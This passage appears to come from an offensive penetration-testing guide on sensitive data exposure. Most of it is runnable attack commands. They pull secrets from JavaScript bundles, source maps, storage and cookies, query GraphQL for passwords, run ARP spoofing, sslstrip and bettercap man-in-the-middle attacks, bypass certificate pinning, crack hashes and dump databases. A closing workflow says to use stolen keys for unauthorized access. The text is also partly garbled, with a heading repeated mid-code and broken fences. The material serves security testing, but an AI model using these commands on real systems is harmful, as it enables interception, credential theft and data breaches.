cat app.js | grep -oE "['\"][^'\"]{10,}['\"]" > strings.txt

# Filter for potential secrets (long alphanumeric strings)
cat strings.txt | grep -E "[a-zA-Z0-9_-]{32,}"

# Look for Base64 encoded data (potential credentials)
cat app.js | grep -oE "[a-zA-Z0-9+/]{40,}={0,2}" | while read encoded; do
    decoded=$(echo "$encoded" | base64 -d 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo "Encoded: $encoded"
        echo "Decoded: $decoded"
        echo "---"
    fi
done
```

**Framework-Specific Exposure**

**React Applications**

```bash
# React apps often bundle environment variables into JS

# Download main JS bundle
curl https://target.com/static/js/main.abc123.js > main.js

# Search for REACT_APP_ variables (exposed at build time)
grep -o "REACT_APP_[A-Z_]*" main.js | sort -u

# Extract values
grep -oE "REACT_APP_[A-Z_]*:['\"][^'\"]+['\"]" main.js

# Example vulnerable pattern:
# REACT_APP_API_KEY:"pk_live_abc123xyz"
# REACT_APP_FIREBASE_KEY:"AIzaSyD..."
```

**Angular Applications**

```bash
# Download Angular bundles
curl https://target.com/main.js > main.js
curl https://target.com/polyfills.js > polyfills.js

# Search for environment configurations
grep -i "environment\|config" main.js

# Angular often has environment.prod.ts bundled
# Look for patterns like:
# production:!0,apiKey:"xyz",apiUrl:"https://api..."
```

**Vue.js Applications**

```bash
# Download Vue bundles
curl https://target.com/app.js > app.js

# Search for VUE_APP_ variables
grep -o "VUE_APP_[A-Z_]*" app.js | sort -u

# Extract configuration
grep -i "apikey\|apiurl\|config" app.js
```

### Source Map Exploitation (Detailed)

**Source Map Detection**

```bash
# Check for sourceMappingURL comments
curl https://target.com/app.js | tail -5

# Common patterns:
# //# sourceMappingURL=app.js.map
# //@ sourceMappingURL=app.js.map (deprecated syntax)

# Derive source map URL
# If app.js contains: //# sourceMappingURL=app.js.map
# Try: https://target.com/app.js.map
```

**Source Map Download and Analysis**

```bash
# Download source map
curl https://target.com/static/js/main.abc123.js.map > main.js.map

# Verify it's a valid source map
cat main.js.map | jq '.version, .sources | length'

# Extract original source file names
cat main.js.map | jq -r '.sources[]'

# Extract original source code
cat main.js.map | jq -r '.sourcesContent[]' > original_source.js

# Search for secrets in original source
grep -i "password\|apikey\|secret\|token" original_source.js
```

**Source Map Structure**

```json
{
  "version": 3,
  "sources": [
    "webpack://app/src/config/api.js",
    "webpack://app/src/auth/login.js",
    "webpack://app/src/utils/database.js"
  ],
  "sourcesContent": [
    "// Original unminified source code here\nconst API_KEY = 'sk_live_...';\n",
    "// More original source...",
    "// Database credentials exposed in comments"
  ],
  "mappings": "AAAA,IAAM..."
}
```

**Automated Source Map Extraction**

```bash
#!/bin/bash
# Extract and analyze source maps

TARGET="$1"

# Find all JavaScript files
wget -r -l 1 -A.js "$TARGET" -P temp/

# Check each JS file for source maps
find temp/ -name "*.js" | while read jsfile; do
    echo "[*] Checking: $jsfile"
    
    # Extract sourceMappingURL
    mapurl=$(tail -5 "$jsfile" | grep -oP '(?<=sourceMappingURL=).*')
    
    if [ ! -z "$mapurl" ]; then
        echo "[+] Found source map reference: $mapurl"
        
        # Download source map
        if [[ $mapurl == http* ]]; then
            curl -s "$mapurl" > "${jsfile}.map"
        else
            # Relative URL
            basepath=$(dirname "$jsfile")
            curl -s "${TARGET}/${mapurl}" > "${jsfile}.map"
        fi
        
        # Extract and search original source
        if [ -f "${jsfile}.map" ]; then
            jq -r '.sourcesContent[]?' "${jsfile}.map" 2>/dev/null | \
                grep -iE "password|api.*key|secret|token|credential" | \
                head -20
        fi
    fi
done
```

### Local Storage and Session Storage

**Inspection Techniques**

```javascript
// Browser console commands (DevTools)

// Dump all localStorage
for (let i = 0; i < localStorage.length; i++) {
    let key = localStorage.key(i);
    console.log(key + ": " + localStorage.getItem(key));
}

// Dump all sessionStorage
for (let i = 0; i < sessionStorage.length; i++) {
    let key = sessionStorage.key(i);
    console.log(key + ": " + sessionStorage.getItem(key));
}

// Export as JSON
console.log(JSON.stringify(localStorage));
console.log(JSON.stringify(sessionStorage));

// Check for sensitive keys
["token", "jwt", "auth", "api_key", "password", "secret"].forEach(keyword => {
    Object.keys(localStorage).forEach(key => {
        if (key.toLowerCase().includes(keyword)) {
            console.log(`Found in localStorage: ${key} = ${localStorage.getItem(key)}`);
        }
    });
});
```

**Automated Storage Extraction**

```bash
# Using browser automation (Puppeteer/Playwright)

# Create extraction script: extract_storage.js
cat > extract_storage.js << 'EOF'
const puppeteer = require('puppeteer');

(async () => {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    
    await page.goto(process.argv[2]);
    
    // Extract localStorage
    const localStorage = await page.evaluate(() => {
        return JSON.stringify(window.localStorage);
    });
    
    // Extract sessionStorage
    const sessionStorage = await page.evaluate(() => {
        return JSON.stringify(window.sessionStorage);
    });
    
    console.log("localStorage:", localStorage);
    console.log("sessionStorage:", sessionStorage);
    
    await browser.close();
})();
EOF

# Run extraction
node extract_storage.js https://target.com
```

**Common Vulnerable Storage Patterns**

```javascript
// Anti-patterns found in client-side code

// Storing JWT tokens (acceptable but check for sensitive data in payload)
localStorage.setItem('jwt', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

// Storing API keys (VULNERABLE)
localStorage.setItem('api_key', 'sk_live_abc123...');

// Storing passwords (HIGHLY VULNERABLE)
localStorage.setItem('password', 'UserPassword123');

// Storing session tokens (check token scope)
sessionStorage.setItem('session_token', 'sess_abc123xyz...');

// Storing database credentials (HIGHLY VULNERABLE)
localStorage.setItem('db_config', JSON.stringify({
    host: 'db.example.com',
    user: 'admin',
    password: 'DbPass123'
}));
```

**JWT Token Analysis from Storage**

```bash
# Extract JWT from localStorage (via browser console)
# Then analyze payload

JWT_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Decode JWT payload (Base64)
echo "$JWT_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

# Or use jwt_tool
jwt_tool "$JWT_TOKEN"

# Check for sensitive data in payload
# - Database credentials
# - API keys
# - PII (Personally Identifiable Information)
# - Internal URLs/endpoints
```

### HTML Comments and Metadata

**HTML Comment Extraction**

```bash
# Download and extract all HTML comments
curl -s https://target.com | grep -oP '<!--.*?-->' | sed 's/<!--/\n/g' | sed 's/-->//g'

# Recursive crawling and comment extraction
wget -r -l 2 https://target.com
find . -name "*.html" -exec grep -H "<!--.*-->" {} \; | tee html_comments.txt

# Search for sensitive data in comments
cat html_comments.txt | grep -iE "password|credential|api.*key|token|secret|admin|database"
```

**Common Patterns in HTML Comments**

```html
<!-- Developer notes exposing credentials -->
<!-- TODO: Change default admin password: Admin123! -->
<!-- API Endpoint: https://internal-api.example.com/v1 -->
<!-- Database: mysql://root:password@localhost/webapp -->

<!-- Commented-out code with credentials -->
<!--
<script>
    var dbConfig = {
        host: "192.168.1.100",
        user: "webapp_user",
        password: "P@ssw0rd123"
    };
</script>
-->

<!-- Debug information -->
<!-- User ID: 12345, Role: admin, Token: abc123xyz -->

<!-- Old/deprecated API keys -->
<!-- Old API Key (deprecated): sk_test_oldkey123 -->
<!-- New API Key: sk_live_newkey456 -->
```

**Meta Tags with Sensitive Data**

```bash
# Extract meta tags
curl -s https://target.com | grep -i "<meta" 

# Look for custom meta tags with sensitive info
curl -s https://target.com | grep -iE "<meta.*api|<meta.*key|<meta.*token"

# Example vulnerable meta tags:
# <meta name="api-key" content="AIzaSyD...">
# <meta name="app-token" content="abc123...">
# <meta name="internal-url" content="https://internal.example.com">
```

**Data Attributes**

```bash
# Extract data-* attributes
curl -s https://target.com | grep -oP 'data-[a-z-]*="[^"]*"' | sort -u

# Look for sensitive data in attributes
curl -s https://target.com | grep -iE 'data-.*api|data-.*key|data-.*token|data-.*secret'

# Example:
# <div data-api-key="xyz123" data-endpoint="https://api.internal.com">
```

### Cookies with Sensitive Data

**Cookie Inspection**

```bash
# Extract cookies via curl
curl -i https://target.com | grep -i "set-cookie"

# Detailed cookie analysis
curl -c cookies.txt https://target.com
cat cookies.txt

# Check cookie attributes
# Look for:
# - Secure flag (missing = can be transmitted over HTTP)
# - HttpOnly flag (missing = accessible via JavaScript)
# - SameSite attribute
```

**JavaScript Cookie Access**

```javascript
// Browser console - extract all cookies
console.log(document.cookie);

// Parse cookies
document.cookie.split(';').forEach(cookie => {
    console.log(cookie.trim());
});

// Search for sensitive patterns
document.cookie.split(';').forEach(cookie => {
    if (/api|key|token|secret|password/i.test(cookie)) {
        console.log("Potential sensitive cookie:", cookie);
    }
});
```

**Vulnerable Cookie Patterns**

```bash
# Credentials in cookies
Set-Cookie: admin_password=PlainTextPass123; Path=/

# API keys in cookies
Set-Cookie: api_key=sk_live_abc123xyz; Path=/

# Database tokens
Set-Cookie: db_token=mysql_token_123; Path=/

# Unencrypted session data
Set-Cookie: session_data={"user":"admin","role":"superadmin"}; Path=/

# Check if cookies lack security flags
Set-Cookie: sensitive_token=abc123; Path=/
# Should be: Set-Cookie: sensitive_token=abc123; Path=/; Secure; HttpOnly; SameSite=Strict
```

### GraphQL Introspection

**Introspection Query**

```bash
# GraphQL introspection can expose sensitive schema

# Basic introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query IntrospectionQuery { __schema { types { name fields { name type { name kind ofType { name kind } } } } } }"
  }'

# Or use GraphQL-specific tools
# Install: npm install -g graphql-cli

# Introspect schema
graphql get-schema --endpoint https://target.com/graphql --output schema.graphql

# Search for sensitive types/fields
cat schema.graphql | grep -iE "password|secret|key|token|credential|private"
```

**Exposed Sensitive Fields**

```graphql
# Example vulnerable GraphQL schema

type User {
  id: ID!
  username: String!
  email: String!
  password: String!          # VULNERABLE: Password exposed
  apiKey: String             # VULNERABLE: API key exposed
  internalNotes: String      # VULNERABLE: Internal data exposed
}

type Config {
  databaseUrl: String!       # VULNERABLE: DB connection string
  jwtSecret: String!         # VULNERABLE: JWT secret exposed
  privateKey: String!        # VULNERABLE: Private key exposed
}
```

**Querying Exposed Data**

```bash
# Query exposed sensitive fields
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ users { username password apiKey } }"
  }'

# Query config data
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ config { databaseUrl jwtSecret } }"
  }'
```

### WebSocket Message Inspection

**WebSocket Traffic Capture**

```javascript
// Browser DevTools > Network tab > WS filter
// Or intercept with proxy (Burp Suite, OWASP ZAP)

// Programmatic WebSocket inspection
const ws = new WebSocket('wss://target.com/socket');

ws.onmessage = function(event) {
    console.log('Received:', event.data);
    
    // Check for sensitive data
    if (/api.*key|password|secret|token/i.test(event.data)) {
        console.log('SENSITIVE DATA DETECTED:', event.data);
    }
};

ws.onopen = function() {
    console.log('WebSocket opened');
    // Send test messages
    ws.send(JSON.stringify({action: 'getConfig'}));
};
```

**Common WebSocket Vulnerabilities**

```json
// Server sending credentials over WebSocket

// Authentication messages
{
  "type": "auth_response",
  "token": "eyJhbGci...",
  "api_key": "sk_live_abc123"
}

// Configuration sync
{
  "type": "config_update",
  "database_url": "mongodb://admin:pass@db.host.com",
  "redis_url": "redis://:password@redis.host.com:6379"
}

// Debug messages
{
  "type": "debug",
  "internal_api": "https://internal-api.company.com",
  "admin_token": "admin_secret_token_123"
}
```

## Insecure Transmission

Insecure transmission occurs when sensitive data is sent over unencrypted channels or improperly protected encrypted channels.

### HTTP vs HTTPS Analysis

**Protocol Detection**

```bash
# Check if site forces HTTPS
curl -I http://target.com

# Look for redirects to HTTPS
# HTTP/1.1 301 Moved Permanently
# Location: https://target.com/

# Check if redirect is missing
# HTTP/1.1 200 OK (VULNERABLE - no redirect)

# Test specific endpoints for HTTP availability
curl -I http://target.com/login
curl -I http://target.com/api/auth
curl -I http://target.com/admin
```

**Mixed Content Detection**

```bash
# Download page and check for HTTP resources on HTTPS page
curl -s https://target.com | grep -oE 'http://[^"' ]*' 

# Resources that should be HTTPS:
# - <script src="http://...">  (scripts)
# - <link href="http://...">   (stylesheets)
# - <img src="http://...">     (images can leak referer)
# - <form action="http://..."> (form submissions)

# Check for HTTP API endpoints
curl -s https://target.com | grep -oE 'http://[^"' ]*api[^"' ]*'
```

**HSTS (HTTP Strict Transport Security) Testing**

```bash
# Check for HSTS header
curl -I https://target.com | grep -i strict-transport-security

# Proper HSTS header:
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Missing or weak HSTS (VULNERABLE):
# - No header present
# - Short max-age (e.g., max-age=300)
# - Missing includeSubDomains
```

**HTTP Authentication Schemes**

```bash
# Test if HTTP supports authentication
curl -v http://target.com/api/login \
  -d '{"username":"test","password":"test"}'

# VULNERABLE if:
# - Returns 200 OK or processes request
# - Does not redirect to HTTPS
# - Authentication succeeds over HTTP

# Check for HTTP Basic Auth over HTTP
curl -v -u "user:pass" http://target.com/admin
# VULNERABLE if authentication works (credentials sent in clear text)
```

### Man-in-the-Middle (MITM) Testing

**SSL/TLS Configuration Testing**

```bash
# Use testssl.sh for comprehensive SSL/TLS testing
testssl.sh https://target.com

# Or use sslyze
sslyze --regular target.com

# Or use nmap scripts
nmap --script ssl-enum-ciphers -p 443 target.com

# Check for weak protocols
nmap --script ssl-enum-ciphers -p 443 target.com | grep -E "SSLv2|SSLv3|TLSv1.0|TLSv1.1"
# VULNERABLE if old protocols enabled
```

**Certificate Validation**

```bash
# Check certificate details
openssl s_client -connect target.com:443 -showcerts

# Extract certificate
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -text -noout

# Check expiration
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -noout -dates

# Check for self-signed certificate
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -noout -issuer -subject
# VULNERABLE if issuer == subject (self-signed)

# Check certificate chain
openssl s_client -connect target.com:443 -showcerts 2>/dev/null | \
  grep -E "subject=|issuer="
```

**Cipher Suite Analysis**

```bash
# List supported ciphers
nmap --script ssl-enum-ciphers -p 443 target.com

# Test for weak ciphers
sslscan target.com | grep -iE "accepted.*weak|accepted.*null|accepted.*export|accepted.*des"

# VULNERABLE ciphers include:
# - NULL encryption (no encryption)
# - EXPORT grade (weak encryption)
# - DES/3DES (deprecated)
# - RC4 (broken)
# - MD5 in cipher suite (weak hash)

# Check for CBC vulnerabilities (BEAST, Lucky13)
testssl.sh --cipher-per-proto https://target.com | grep CBC
```

### Traffic Interception Techniques

**Passive Network Sniffing**

```bash
# Capture HTTP traffic (requires network access)
tcpdump -i eth0 -A 'tcp port 80' -w http_traffic.pcap

# Filter for specific host
tcpdump -i eth0 -A host target.com and port 80 -w target_http.pcap

# Read captured traffic
tcpdump -r http_traffic.pcap -A | grep -iE "password|authorization|cookie|api.*key"

# Or use Wireshark
wireshark http_traffic.pcap
# Apply filter: http.request.method == "POST"
# Look for credentials in POST data
```

**Active MITM with mitmproxy**

```bash
# Install mitmproxy
apt install mitmproxy

# Start transparent proxy
mitmproxy --mode transparent --showhost

# Or start web interface
mitmweb --mode transparent --showhost

# Configure client/device to use proxy
# On client: Set proxy to attacker_ip:8080

# Install mitmproxy CA certificate on client
# Certificate location: ~/.mitmproxy/mitmproxy-ca-cert.pem

# Intercept and modify traffic
# Press 'i' to set intercept filter
# Filter examples:
# ~u target.com  (intercept target.com requests)
# ~m POST        (intercept POST requests)
# ~s             (intercept responses)

# Search captured traffic for sensitive data
# In mitmproxy console: Press '/' then search for "password"
```

**SSLStrip Attack** [Inference] SSLStrip downgrades HTTPS connections to HTTP when HSTS is not implemented, allowing plaintext interception.

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Setup iptables redirect
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 10000

# Run sslstrip
sslstrip -l 10000 -w sslstrip.log

# ARP spoofing to position as MITM (requires network access)
arpspoof -i eth0 -t victim_ip gateway_ip
arpspoof -i eth0 -t gateway_ip victim_ip

# Monitor captured credentials
tail -f sslstrip.log | grep -iE "password|authorization"
```

**Bettercap MITM Framework**

```bash
# Install bettercap
apt install bettercap

# Start bettercap
bettercap -iface eth0

# Enable modules
# In bettercap console:
> net.probe on
> set arp.spoof.targets victim_ip
> arp.spoof on
> set http.proxy.sslstrip true
> http.proxy on
> net.sniff on

# Captured credentials stored in:
> events.show http.request
```

### POST Data Exposure

**Form Submission Analysis**

```bash
# Check if login form submits over HTTP
curl -s https://target.com/login | grep -i '<form' | grep -i 'action'

# VULNERABLE patterns:
# <form action="http://target.com/login" method="POST">
# <form action="/login" method="POST">  (on HTTP page)

# Test form submission
curl -v -X POST http://target.com/login \
  -d "username=test&password=test123" \
  --trace-ascii /dev/stdout

# Check if credentials visible in clear text in trace
```

**GET Parameter Exposure**

```bash
# Check if sensitive data in URL parameters
curl -v "http://target.com/login?username=admin&password=pass123"

# VULNERABLE patterns:
# http://target.com/api/auth?api_key=xyz123
# http://target.com/reset?token=reset_token_123
# http://target.com/user?ssn=123-45-6789

# URL parameters logged in:
# - Web server access logs
# - Proxy server logs
# - Browser history
# - Referrer headers (when following links)
```

**Referer Header Leakage**

```bash
# Simulate referer leakage
curl -H "Referer: https://target.com/dashboard?token=abc123" \
  https://external-site.com/image.jpg

# External site receives token in Referer header

# Check for token/key in URLs that might leak via Referer
curl -s https://target.com | grep -oE 'https?://[^"' ]*[?&](token|key|api_key|session)=[^"' ]*'

# Proper mitigation: Referrer-Policy header
curl -I https://target.com | grep -i referrer-policy
# Should be: Referrer-Policy: no-referrer or same-origin
```

### API Security Testing

**Unencrypted API Endpoints**

```bash
# Check if API accessible over HTTP
curl -I http://api.target.com/v1/users
curl -I http://target.com/api/v1/auth

# Test authentication over HTTP
curl -X POST http://api.target.com/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'

# VULNERABLE if:
# - Returns 200 OK
# - Does not redirect to HTTPS
# - Accepts and processes authentication
```

**API Key Transmission**

```bash
# Check how API keys are transmitted

# In URL (HIGHLY VULNERABLE)
curl "http://api.target.com/data?api_key=xyz123"

# In GET parameters over HTTPS (VULNERABLE - logged)
curl "https://api.target.com/data?api_key=xyz123"

# In Authorization header (PROPER)
curl https://api.target.com/data \
  -H "Authorization: Bearer xyz123"

# Check for keys in response headers
curl -I https://api.target.com/endpoint | grep -iE "x-api-key|api-key"
```

**WebSocket Security**

```bash
# Check if WebSocket uses WSS (secure) or WS (insecure)

# VULNERABLE: ws://target.com/socket
# SECURE: wss://target.com/socket

# Test with wscat
wscat -c ws://target.com/socket
# Send test messages and check for sensitive data

# Proper implementation requires WSS
wscat -c wss://target.com/socket
```

### Mobile App Traffic Analysis

**Certificate Pinning Bypass** [Inference] Mobile apps may implement certificate pinning, requiring bypass to intercept HTTPS traffic.

```bash
# For Android apps

# Install Frida
pip install frida-tools

# Run Frida server on Android device
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Universal SSL pinning bypass script
frida -U -f com.target.app -l ssl-unpinning-script.js

# ssl-unpinning-script.js:
Java.perform(function() {
    // Bypass common SSL pinning libraries
    // (TrustManager, OkHttp, etc.)
});

# Configure device to use proxy (Burp Suite, mitmproxy)
adb shell settings put global http_proxy attacker_ip:8080

# Install proxy CA certificate on device
# Install mitmproxy-ca-cert.pem in device's trusted certificates
```

**Traffic Capture and Analysis**

```bash
# Capture mobile app traffic
# 1. Configure device proxy settings
# 2. Install proxy CA certificate
# 3. Start proxy (Burp Suite, mitmproxy)
# 4. Launch app and use features

# In Burp Suite:
# - Proxy > HTTP history
# - Filter by host: target.com
# - Look for:
#   - HTTP requests (should be HTTPS)
#   - Sensitive data in GET parameters
#   - Unencrypted POST data
#   - API keys in headers/cookies

# Export captured traffic
# Proxy > HTTP history > Save items

# Search for sensitive patterns
grep -iE "password|api.*key|token|secret|credit.*card|ssn" saved_traffic.txt
```

### Email Transmission Security

**SMTP Security Testing**

```bash
# Check if email server supports STARTTLS
openssl s_client -connect mail.target.com:587 -starttls smtp

# Check for SSL/TLS on submission port
openssl s_client -connect mail.target.com:465

# VULNERABLE if:
# - No STARTTLS support on port 587
# - Port 25 used without encryption
# - Self-signed or invalid certificate

# Test for cleartext authentication
telnet mail.target.com 25
EHLO test
MAIL FROM: test@example.com
RCPT TO: target@target.com
DATA
Subject: Test
Body content
.
# VULNERABLE if accepted without encryption
```

**Email Header Analysis**

```bash
# Check email headers for sensitive data leakage
# View full email headers (in email client)

# Look for:
# X-Originating-IP: (internal IP exposed)
# X-Authenticated-User: (username exposed)
# X-Mailer: (application/version exposed)
# User-Agent: (client information)

# Sensitive data in subject or headers
# Subject: Password reset token: abc123xyz
```

### Network-Level Detection

**Port Scanning for Unencrypted Services**

```bash
# Scan for common unencrypted services
nmap -sV -p 21,23,25,80,110,143,3306,5432,27017,6379 target.com

# VULNERABLE services:
# 21   - FTP (cleartext)
# 23   - Telnet (cleartext)
# 25   - SMTP (cleartext unless STARTTLS)
# 80   - HTTP (cleartext)
# 110  - POP3 (cleartext unless STARTTLS)
# 143  - IMAP (cleartext
# Insecure Transmission (Continued)

unless STARTTLS)

# 3306 - MySQL (cleartext)

# 5432 - PostgreSQL (cleartext)

# 27017 - MongoDB (cleartext)

# 6379 - Redis (cleartext)

# Check for encrypted alternatives

nmap -sV -p 443,465,587,993,995,3307,5433,27018 target.com

# 443 - HTTPS (encrypted)

# 465 - SMTPS (encrypted)

# 587 - SMTP with STARTTLS

# 993 - IMAPS (encrypted)

# 995 - POP3S (encrypted)
````

**Service Enumeration**
```bash
# Detailed service fingerprinting
nmap -sV -A target.com

# Check if services require authentication
nmap --script default,auth -p 21,23,3306,5432,6379,27017 target.com

# Identify default credentials
# Services with default credentials often have:
# - No authentication prompt
# - Standard ports open
# - Service banners revealing version

nmap --script mysql-info -p 3306 target.com
nmap --script redis-info -p 6379 target.com
nmap --script mongodb-info -p 27017 target.com
````

**Protocol Analysis**

```bash
# Capture and analyze unencrypted protocol traffic
tcpdump -i eth0 -A 'port 3306 or port 5432 or port 6379' -w db_traffic.pcap

# Read and search for credentials
tcpdump -r db_traffic.pcap -A | grep -iE "password|user|auth|login"

# Use Wireshark for GUI analysis
wireshark db_traffic.pcap

# Protocol-specific dissectors show unencrypted:
# - MySQL passwords
# - PostgreSQL credentials
# - Redis commands with sensitive data
```

### Remediation Verification

**HTTPS Implementation Checklist**

```bash
# Verify proper HTTPS implementation

# 1. Force HTTPS redirect
curl -I http://target.com | grep -i "location.*https"

# 2. HSTS header present
curl -I https://target.com | grep -i "strict-transport-security"

# 3. No mixed content
curl -s https://target.com | grep -c "http://" 
# Should return 0

# 4. Strong cipher suites
testssl.sh https://target.com | grep "Cipher strength" | grep -v "strong"
# Should show only strong ciphers

# 5. Certificate validity
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -noout -dates

# 6. TLS version
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  grep "Protocol"
# Should be TLSv1.2 or higher

# 7. No SSL/early TLS versions
nmap --script ssl-enum-ciphers -p 443 target.com | grep -i "SSLv\|TLSv1.0\|TLSv1.1"
# Should return nothing
```

**API Security Checklist**

```bash
# Verify secure API transmission

# 1. All endpoints use HTTPS
curl -I http://api.target.com/v1/users | grep -i "location.*https"

# 2. API keys in Authorization header
# Capture request and verify:
# Authorization: Bearer <token>
# Not in URL parameters

# 3. Sensitive data endpoints require authentication
curl -I https://api.target.com/v1/users/profile
# Should return 401 without authentication

# 4. Proper CORS headers (no overly permissive)
curl -I https://api.target.com/v1/data | grep -i "access-control"
# Should NOT be: Access-Control-Allow-Origin: *

# 5. API versioning with sunset headers
curl -I https://api.target.com/v1/data | grep -i "sunset\|deprecation"

# 6. Rate limiting headers
curl -I https://api.target.com/v1/data | grep -iE "ratelimit|x-rate"
```

**Database Security Checklist**

```bash
# Verify secure database transmission

# 1. No cleartext database connections from application
# Check application code/configs for:
grep -r "mysql://.*@" .config/
grep -r "postgresql://.*@" .config/
# Should not contain plaintext credentials

# 2. Database server requires authentication
# Attempt connection without credentials
mysql -h db.target.com -e "SELECT 1;"
# Should fail with access denied

# 3. Use SSL/TLS for database connections
# Check if SSL certificates required
mysql -h db.target.com --ssl-verify-server-cert -e "SELECT 1;"

# 4. Encrypted storage of credentials
# Application should use environment variables or secrets manager
# Not hardcoded in source code

# 5. Database runs on non-standard port (defense in depth)
nmap -sV -p 3300-3400 db.target.com
# Check if MySQL running on non-standard port

# 6. Firewall restricts database access
# Database should only be accessible from app servers
# Not publicly accessible
nmap -sV -p 3306 target.com
# Should timeout or show filtered, not open
```

---

## Summary: Sensitive Data Exposure Exploitation Workflow

**Reconnaissance Phase**

1. Identify all web assets (subdomains, endpoints, services)
2. Check for HTTP endpoints (should redirect to HTTPS)
3. Scan for exposed services (unencrypted databases, caches)
4. Review SSL/TLS certificate configuration

**Source Code Extraction Phase**

1. Test for backup files (.bak, .old, .swp, ~)
2. Check for exposed git/SVN/HG repositories
3. Download source maps from JavaScript
4. Extract configuration files (.env, config.php, etc.)

**Credential Discovery Phase**

1. Search source code for hardcoded credentials
2. Analyze comments for sensitive information
3. Check for database connection strings
4. Identify API keys and secrets

**Validation and Exploitation Phase**

1. Test discovered credentials against services
2. Validate connection strings to databases
3. Use exposed keys/tokens for unauthorized access
4. Enumerate accessible data and systems

**Network Testing Phase**

1. Test for HTTP transmission of sensitive data
2. Verify HTTPS implementation strength
3. Check for mixed content vulnerabilities
4. Test for protocol downgrade possibilities

**Important Related Topics:**

- **Authentication Bypass** - Using exposed credentials for unauthorized access
- **Privilege Escalation** - Leveraging database access for system-level compromise
- **Data Exfiltration** - Efficiently extracting sensitive data from compromised systems
- **Cryptography Weaknesses** - Exploiting weak encryption in data transmission
- **Cloud Infrastructure Security** - Exposed cloud credentials and metadata services

---

## Unencrypted Storage

Unencrypted storage vulnerabilities occur when sensitive data persists on disk, in memory, or in databases without cryptographic protection, allowing attackers to read it directly.

### Database Storage Analysis

**Plaintext Password Storage**

[Inference] When passwords are stored as plaintext in databases, a single database breach exposes all user credentials for immediate use.

```bash
# Download and access exposed database
wget https://target.com/backup.sql
sqlite3 users.db "SELECT * FROM users;"

# Examine user table structure
sqlite3 users.db "PRAGMA table_info(users);"

# Search for password columns
sqlite3 users.db "SELECT sql FROM sqlite_master WHERE type='table' AND name='users';"

# Example vulnerable schema:
# CREATE TABLE users (
#   id INTEGER PRIMARY KEY,
#   username TEXT,
#   password TEXT,  -- VULNERABLE: plaintext
#   email TEXT,
#   created_at TIMESTAMP
# );

# Extract credentials
sqlite3 users.db "SELECT username, password FROM users;" > credentials.txt
```

**Weak Hashing Detection**

```bash
# Identify weak hash algorithms by hash characteristics

# MD5 (32 hex characters, broken)
grep -E '^[a-f0-9]{32}$' hashes.txt

# SHA1 (40 hex characters, weak)
grep -E '^[a-f0-9]{40}$' hashes.txt

# SHA256 (64 hex characters, stronger but needs salt)
grep -E '^[a-f0-9]{64}$' hashes.txt

# bcrypt (60 characters, starts with $2a$, $2b$, or $2y$, stronger)
grep -E '^\$2[aby]\$' hashes.txt

# scrypt or argon2 (longer, modern formats)
grep -E '^\$7\$|^\$argon2' hashes.txt

# MySQL old_password hash (16 hex characters, deprecated)
grep -E '^[a-f0-9]{16}$' hashes.txt

# Crack weak hashes
hashcat -m 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 100 sha1_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1400 sha256_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Unsalted Hash Vulnerability**

```bash
# Check if hashes are salted by testing known values
# Calculate MD5 of known password
echo -n "password123" | md5sum
# Output: 482c811da5d5b4bc6d497ffa98491e38

# Query database for matching hash
sqlite3 users.db "SELECT username FROM users WHERE password='482c811da5d5b4bc6d497ffa98491e38';"

# If match found, password is either:
# 1. MD5 unsalted
# 2. MD5("password123" + known_salt)

# Test multiple unsalted passwords
for pass in "admin" "password" "123456" "admin123"; do
    hash=$(echo -n "$pass" | md5sum | cut -d' ' -f1)
    echo "Password: $pass, Hash: $hash"
done

# If these match database hashes, no salting used (VULNERABLE)
```

**Database Query Injection to Extract Data**

```bash
# If database access gained, extract sensitive data

# MySQL
mysql -h host -u user -p'password' database -e "
SELECT table_name FROM information_schema.tables 
WHERE table_schema = 'database';
"

# Find tables with sensitive data
mysql -h host -u user -p'password' database -e "
SELECT column_name FROM information_schema.columns 
WHERE table_schema = 'database' 
AND column_name REGEXP 'password|secret|key|token|credit|ssn|private';
"

# Extract sensitive columns
mysql -h host -u user -p'password' database -e "
SELECT id, username, email, password FROM users;
" > extracted_data.txt

# Export to file (if FILE privilege exists)
mysql -h host -u user -p'password' database -e "
SELECT id, username, password INTO OUTFILE '/tmp/users.txt'
FROM users;
"

# PostgreSQL
psql -h host -U user -d database -c "
SELECT table_name FROM information_schema.tables 
WHERE table_schema = 'public';
"

# Extract data
psql -h host -U user -d database -c "
SELECT username, password, email FROM users;
" > extracted_data.txt

# MongoDB
mongosh "mongodb://user:pass@host:27017/database"
db.users.find({}, {username: 1, password: 1, email: 1})
db.users.find().forEach(doc => print(JSON.stringify(doc)))

# Redis (plaintext by default)
redis-cli -h host -p 6379 KEYS "*password*"
redis-cli -h host -p 6379 GET "user:123:password"
redis-cli -h host -p 6379 HGETALL "user:admin"
```

### File System Storage Analysis

**Unencrypted File Permissions**

```bash
# Check file permissions for readable sensitive files
ls -la /var/www/html/config/
